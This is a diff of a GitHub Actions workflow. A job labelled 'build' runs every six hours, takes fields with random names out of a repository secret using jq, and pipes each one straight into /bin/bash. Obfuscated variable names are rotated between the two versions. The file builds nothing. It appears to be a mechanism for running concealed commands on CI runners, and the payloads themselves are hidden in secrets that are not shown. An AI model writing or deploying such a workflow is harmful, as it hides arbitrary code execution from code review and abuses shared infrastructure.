@@ -1,33 +1,23 @@
 name: peiyuanxie2603
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
+    - cron: '6 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: peiyuanxie2603
         env:
-          n15: ${{ secrets.n15 }}
+          oolqp88: ${{ secrets.oolqp88 }}
         run: |
-          echo $n15 | jq -r .wzwop48107 | /bin/bash
-          echo $bsyu8 | jq -r .isjb832 | /bin/bash
-          echo $pn882 | jq -r .evspw2 | /bin/bash
-          echo $urwx54992 | jq -r .f61208 | /bin/bash
-          echo $wpo74266 | jq -r .jrpih53 | /bin/bash
-          echo $a61 | jq -r .ivlhq372 | /bin/bash
-          echo $zpwsc68 | jq -r .vq18914 | /bin/bash
-          echo $u5 | jq -r .mj62 | /bin/bash
-          echo $gxm77 | jq -r .gny3 | /bin/bash
-          echo $anxyg9812 | jq -r .vomh81 | /bin/bash
-          echo $t651 | jq -r .c8 | /bin/bash
-          echo $jtvc7792 | jq -r .x2 | /bin/bash
-          echo $ipog2596 | jq -r .cs93 | /bin/bash
-          echo $pgov971 | jq -r .f58 | /bin/bash
-          echo $uq07 | jq -r .brlr32980 | /bin/bash
+          echo $oolqp88 | jq -r .g4 | /bin/bash
+          echo $js0 | jq -r .fa6300 | /bin/bash
+          echo $eqba1 | jq -r .q5 | /bin/bash
+          echo $gd61 | jq -r .hdg94715 | /bin/bash
+          echo $k6905 | jq -r .tddth683 | /bin/bash
+          echo $dyh77 | jq -r .c518 | /bin/bash
+          echo $wyvbo798 | jq -r .y59 | /bin/bash
 
